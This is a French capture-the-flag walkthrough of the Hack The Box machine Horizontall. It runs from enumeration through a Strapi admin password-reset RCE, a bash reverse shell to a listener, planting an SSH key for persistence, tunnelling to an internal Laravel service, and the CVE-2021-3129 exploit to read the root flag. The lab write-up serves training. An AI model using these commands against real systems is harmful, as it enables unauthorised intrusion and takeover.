# Horizontall [Linux] Easy

# — 1.Enumeration —

## Nmap

`nmap -A -sS -sV -p- 10.10.11.105`

```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

Quand on se rend sur le port 80 on à une redirection à horizontall.htb on va changer un paramètre de notre DNS avec cette commande :

`echo "10.10.11.105 horizontall.htb" | sudo tee -a /etc/hosts`

## Ffuf

```bash
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
favicon.ico             [Status: 200, Size: 4286, Words: 8, Lines: 1]
img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
index.html              [Status: 200, Size: 901, Words: 43, Lines: 2]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
```

## Le Site

Aucun bouton du site ne marche tout peux nous renvoyer su la page d’accueil on ne peux pas aller dans les dossiers que ffuf à trouver. On peux quand même regarder le js de la page pour trouver un indice. Il y a [app.c68eb462.js](http://horizontall.htb/js/app.c68eb462.js) qui est un code en 1 seul ligne ce qui rend difficile la lecture mais nous pouvons utiliser [https://beautifier.io/](https://beautifier.io/) pour rendre le code plus lisible.

Dans le code de app[.c68eb462.js](http://horizontall.htb/js/app.c68eb462.js) se rend compte qu’on utilise du Vue js c’est d’ailleurs le logo du site et on vois dans les méthodes  du script qu’on utilise le site 

[](http://api-prod.horizontall.htb/reviews)

![Untitled](Horizontall%20%5BLinux%5D%20Easy/Untitled.png)

On re-modifie notre fichier hosts

`echo "10.10.11.105 api-prod.horizontall.htb" | sudo tee -a /etc/hosts`

![Untitled](Horizontall%20%5BLinux%5D%20Easy/Untitled%201.png)

Nous sommes donc sur un sous-domaine du site précédent nous pouvons énumérer le site

## Ffuf Le 2

```bash
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
```

On à donc la page admin du CMS qui est strapi et nous pouvons essayer de nous identifier.

# — 2.Exploit —

On trouve avec une recherche Google un CVE de Strapi qui est un RCE et nous permet de mettre le mot de passe que nous voulons sur l’admin panel 

On trouve avec un exploit sur exploit-db : [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239)

```bash
python3 cmsexploit.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjU0NDQzNTE5LCJleHAiOjE2NTcwMzU1MTl9.a8Os4RNhGakrtQ7jfHb106kAUbzaGehXW0IL-X6AgAg
$> bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

En même temps nous mettons un listener `nc -lvnp 1234`

Nous avons maintenant un accès admin sur le panel du CMS et sur la machine en tant que strapi.

![Untitled](Horizontall%20%5BLinux%5D%20Easy/Untitled%202.png)

# — 3.Mouvement Latéral —

On va d’abords invoqué tty pour avoir un shell entier :

```bash
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
*Enter deux fois*
```

On peut pas faire de `sudo -l`

On peut aussi déjà accéder à user.txt pour récupérer le flag.

On créé un serveur avec python `python -m http.server 80` et on récupére un script d’énumération comme linpeas.sh.

On trouve des Ports Actif sur la machine et ces ports n’avait pas été trouvé par notre scan nmap :

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                  
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1704/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Avec ce site [https://www.speedguide.net/port.php?port=3306](https://www.speedguide.net/port.php?port=3306) on peux trouver ce que sont ces ports par défaut selon nmap :

1337 : Nullsoft WASTE encrypted P2P app (Pas certain)

3306 :  mySQL

8000 : Une alternative à http 

- On peux utiliser Curl pour avoir une meilleur idée de ce qu’il y à sur ces ports

- curl 127.0.0.1:1337 Est le sous domaine du site

- curl 127.0.0.1:8000 Est un nouveau sous domaine du site utilisant Laravel

![Untitled](Horizontall%20%5BLinux%5D%20Easy/Untitled%203.png)

## Accès par SSH

Pour ce que nous voulons faire par la suite nous devons avoir un accès par ssh donc nous allons créé sur notre ordinateur un couple de clé `ssh-keygen -f strapi` copié la clé publique et l’écrire sur la machine adverse dans un nouveau dossier .ssh  un ficher authorized_keys contenant notre clé publique avec la commande `vi authorized_keys`

On peux finalement se connecté avec la commande : `ssh -i strapi [strapi@10.10.11.105](mailto:strapi@10.10.11.105)`

On se créé un tunnel sur le port 8000 :

`ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb`

## Troisième Site

Maintenant que nous avons un tunnel nous pouvons aller sur [http://localhost](http://localhost):8000 

![Untitled](Horizontall%20%5BLinux%5D%20Easy/Untitled%204.png)

## Exploitation Final

Laravel à lui aussi un CVE et un https://github.com/nth347/CVE-2021-3129_exploit qui est un RCE nous permettant d’attraper le dernier flag.

Dernière commande :

`./cve-2021-3129.py [http://localhost:8000](http://localhost:8000/) Monolog/RCE1 'cat /root/root.txt'`

Nous récupérons avec cette commande le flag root.

# Notes et Ressources :

[https://www.geeksforgeeks.org/vue-js-methods/](https://www.geeksforgeeks.org/vue-js-methods/)

Ne marche pas sur la machine mais intéressant d’énumérer les sous domaines des le début avec wfuzz :

`wfuzz --hh 194 -u http://horizontall.htb -H "Host: FUZZ.horizontal.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

On pouvait au lieu de tester à l’’aveugle le RCE trouver la version du CMS avec curl :

```
curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}
```